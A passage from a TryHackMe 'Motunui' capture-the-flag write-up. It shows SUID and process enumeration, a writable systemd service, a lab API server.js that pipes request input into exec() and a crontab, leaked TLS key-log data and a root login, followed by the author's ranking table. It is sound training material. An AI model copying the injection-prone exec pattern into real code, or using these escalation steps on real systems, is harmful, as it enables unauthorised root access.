   394323     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   394475     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   524942    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   394471    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   393918     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   393716     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   393920     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   393663     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
   393919     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
   394097     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   393714     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
   393809     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
   393956     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
   394061    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
   393936     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
       66     40 -rwsr-xr-x   1 root     root          40152 Jan 27  2020 /snap/core/9804/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/9804/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/9804/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/9804/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Jan 27  2020 /snap/core/9804/bin/umount
     2607     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/9804/usr/bin/chfn
     2609     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/9804/usr/bin/chsh
     2685     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/9804/usr/bin/gpasswd
     2777     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/9804/usr/bin/newgrp
     2790     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/9804/usr/bin/passwd
     2900    134 -rwsr-xr-x   1 root     root         136808 Jan 31  2020 /snap/core/9804/usr/bin/sudo
     2999     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3369    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/9804/usr/lib/openssh/ssh-keysign
     6423    109 -rwsr-xr-x   1 root     root              110792 Jul 29  2020 /snap/core/9804/usr/lib/snapd/snap-confine
     7600    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9804/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/9665/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/9665/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/9665/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/9665/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/9665/bin/umount
     2605     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
     2607     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
     2683     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
     2775     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
     2788     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
     2898    134 -rwsr-xr-x   1 root     root              136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
     2997     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3367    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
     6405    109 -rwsr-xr-x   1 root     root              110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
     7582    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
   786500     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   787615     44 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /bin/mount
   787633     28 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /bin/umount
   786567     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su
   786551     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
```

```bash
moana@motunui:~$ ps aux | grep root
...
root      1025  0.0  0.1 110416  1696 ?        Ssl  21:31   0:00 /usr/sbin/irqbalance --foreground
root      1028  0.0  0.5 286348  5472 ?        Ssl  21:31   0:00 /usr/lib/accountsservice/accounts-daemon
root      1030  0.0  0.6  70612  5928 ?        Ss   21:31   0:00 /lib/systemd/systemd-logind
root      1033  0.0  0.3  30028  3024 ?        Ss   21:31   0:00 /usr/sbin/cron -f
root      1035  0.0  0.7 264060  7364 ?        Ss   21:31   0:00 /usr/sbin/nmbd --foreground --no-process-group
root      1037  0.0  1.5 169144 15592 ?        Ssl  21:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root      1043  0.1  0.2 604972  2012 ?        Ssl  21:31   0:12 /usr/bin/lxcfs /var/lib/lxcfs/
root      1151  0.9  7.6 964940 75224 ?        Ssl  21:31   1:24 /usr/bin/node /var/www/tls-html/server.js
root      1153  0.0  2.6 784404 26000 ?        Ssl  21:31   0:01 /usr/lib/snapd/snapd
root      1174  0.0  1.8 185948 17804 ?        Ssl  21:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1182  0.0  0.2  14664  2060 ttyS0    Ss+  21:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1186  0.0  0.1  14888  1644 tty1     Ss+  21:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1187  0.0  0.5 291396  5132 ?        Ssl  21:31   0:03 /usr/lib/policykit-1/polkitd --no-debug
root      1261  0.0  0.5  72300  5304 ?        Ss   21:31   0:00 /usr/sbin/sshd -D
root      1273  0.0  1.4 327148 14160 ?        Ss   21:31   0:00 /usr/sbin/apache2 -k start
root      1375  0.0  1.2 355408 12260 ?        Ss   21:31   0:01 /usr/sbin/smbd --foreground --no-process-group
root      1460  0.0  0.4 343656  4904 ?        S    21:31   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1461  0.0  0.3 343680  3432 ?        S    21:31   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1482  0.0  0.5 355392  5536 ?        S    21:31   0:00 /usr/sbin/smbd --foreground --no-process-group
root      2181  0.0  0.0      0     0 ?        I    21:55   0:00 [kworker/u4:1]
root      3011  0.0  0.0      0     0 ?        I    22:22   0:00 [kworker/0:2]
root      3372  0.0  0.0      0     0 ?        I    23:05   0:00 [kworker/u4:2]
root      3471  0.0  0.3  57504  3296 ?        S    23:10   0:00 /usr/sbin/CRON -f
root      3482  0.0  0.3  57504  3296 ?        S    23:11   0:00 /usr/sbin/CRON -f
root      3501  0.0  0.3  57504  3296 ?        S    23:12   0:00 /usr/sbin/CRON -f
root     25314  0.0  0.0      0     0 ?        I    23:37   0:00 [kworker/u4:0]
root     25417  0.0  0.0      0     0 ?        I    23:39   0:00 [kworker/1:2]
root     25547  0.0  0.7 105688  7184 ?        Ss   23:51   0:00 sshd: moana [priv]
root     25552  0.0  0.0      0     0 ?        I    23:51   0:00 [kworker/1:1]
root     25762  0.0  0.3  57504  3316 ?        S    23:55   0:00 /usr/sbin/CRON -f
root     25774  0.0  0.3  57504  3296 ?        S    23:56   0:00 /usr/sbin/CRON -f
moana    25784  0.0  0.1  13136  1004 pts/1    R+   23:56   0:00 grep --color=auto root
```

<img width="1347" height="674" alt="image" src="https://github.com/user-attachments/assets/5de29306-47fb-42e2-b485-493040155978" />

<br>
<br>
<br>

```bash
moana@motunui:~$ ls -la /etc/systemd/system/api.service
-rw-rw-r-- 1 root moana 204 Aug 20  2020 /etc/systemd/system/api.service
```

```bash
moana@motunui:~$ ls -la /etc/systemd/system/multi-user.target.wants/api.service
lrwxrwxrwx 1 root root 31 Jul  9  2020 /etc/systemd/system/multi-user.target.wants/api.service -> /etc/systemd/system/api.service
```

```bash
moana@motunui:~$ cat /etc/systemd/system/multi-user.target.wants/api.service
[Unit]
Description=The API for Motunui

[Service]
User=www-data
Group=www-data
ExecStart=/usr/bin/node /var/www/api.motunui.thm/server.js
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```bash
moana@motunui:~$ ls -la /var/www/api.motunui.thm/server.js
-rw-r--r-- 1 www-data www-data 2330 Aug  3  2020 /var/www/api.motunui.thm/server.js
```

```bash
xx.xxx.xxx.x    d3v3lopm3nt.motunui.thm api.motunui.thm dev.motunui.thm
```

<br>
<p align="center">server.js</p>

```bash
const connect = require('connect');
const http = require('http');
const vhost = require('vhost');
const bodyParser = require('body-parser');
const { exec } = require('child_process');

const app = connect();

app.use(bodyParser.json());

const login = (req, res) => {
	if (req.method !== 'POST') {
		res.writeHead(405);
		return res.end(JSON.stringify({ error: 'method not allowed' }));
	}

	const { username, password } = req.body;

	if (username === 'maui' && password === 'island') {
		res.writeHead(200);
		return res.end(JSON.stringify({ hash: '--------' }));
	}

	res.writeHead(401);
	return res.end(JSON.stringify({ error: 'invalid credentials'  }));
};

const old = (req, res) => {
	res.writeHead(200);
	return res.end(JSON.stringify({ message: 'please get maui to update these routes' }));
}

const jobs = (req, res) => {
	if (req.method === 'GET') {
		if (req.body.hash !== '--------') {
			res.writeHead(403);
			return res.end(JSON.stringify({ error: 'you are unauthorised to view this resource' }));
		}

		exec('cat /var/spool/cron/crontabs/www-data', (err, stdout, stderr) => {
			const cron = stdout.split('\n').filter(entry => !!entry && !entry.startsWith('#'));
			res.writeHead(200);
			return res.end(JSON.stringify({ 'jobs': cron }));
		});

	} else if (req.method === 'POST') {
		if (req.body.hash !== 'aXNsYW5k') {
			res.writeHead(403);
			return res.end(JSON.stringify({ error: 'you are unauthorised to view this reousce' }));
		}

		exec(`echo "${req.body.job}" > /var/spool/cron/crontabs/www-data`, (err, stdout, stderr) => {
			res.writeHead(201);
			return res.end(JSON.stringify({ 'job': req.body.job }));
		});
	} else {
		res.writeHead(405);
		return res.end(JSON.stringify({ error: 'method not allowed' }));
	}

};

const error = (req, res) => {
	res.writeHead(404);
	return res.end(JSON.stringify({ error: 'refer to the documentation for valid routes' }));
};

const server = http.createServer((req, res) => {
	res.setHeader('Content-Type', 'application/json');

	switch (req.url) {
		case '/v1/login': old(req, res); break;
		case '/v1/jobs': old(req, res); break;
		case '/v2/login': login(req, res); break;
		case '/v2/jobs': jobs(req, res); break;
		default: error(req, res);
	}
});

app.use(vhost('api.motunui.thm', (req, res) => {
	server.emit('request', req, res);
}));

app.listen(3000);
```

<br>
<p>/etc/ssl.txt</p>

```bash
moana@motunui:/var/www/api.motunui.thm$ env
...d=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=xx.xxx.xx.xxx48688 xx.xxx.xxx.x 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
XDG_SESSION_ID=288
USER=moana
PWD=/var/www/api.motunui.thm
HOME=/home/moana
SSH_CLIENT=xx.xxx.xx.xxx 48688 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/1
MAIL=/var/mail/moana
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
SSLKEYLOGFILE=/etc/ssl.txt
LOGNAME=moana
```

<br>
<p> align="center">Saved <ins>ssl.txt</ins> content.</p>

```bash
moana@motunui:/etc$ cat ssl.txt
CLIENT_RANDOM 432738e149bdfb67ce70ca989045c1f2f75...57f38e1ed457295 ee0b4...36f5246233ed71164a9a7e017d417afa
...
```

<br>
<br>
<br>
<h1 align="center">Privilege Escalation & Root Flag<a id='12'></a></h1>

<img width="1275" height="716" alt="image" src="https://github.com/user-attachments/assets/20146398-5ba6-49b2-8431-03919299639f" />


```bash
:~/Motunui# ssh root@api.motunui.thm
root@api.motunui.thm's password: 
...
```

```bash
root@motunui:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@motunui:~# pwd
/root
```

```bash
root@motunui:~# ls
root.txt
```

```bash
root@motunui:~# cat root.txt
THM{*****_********}
```

<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e42eeecd-d524-4d1a-8606-e99746adb603"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/58a56910-5c9b-41da-82d6-fbe9e8cff05f"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:   103ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/ba3524c5-795d-4d99-bee5-dc53a7027466"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/2b26da3e-0fc2-4064-b223-7cdbd3404dc9"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3630b239-31cc-43a7-b2f4-cd7949f85dcb"><br>
                  Global monthly:     383ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/97d757bf-f8c7-49f6-82d6-717bdb91cf4e"><br>
                  Brazil monthly:       4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/5a08efbd-7ddb-4f45-a91a-bc28f9af3c0f"><br>
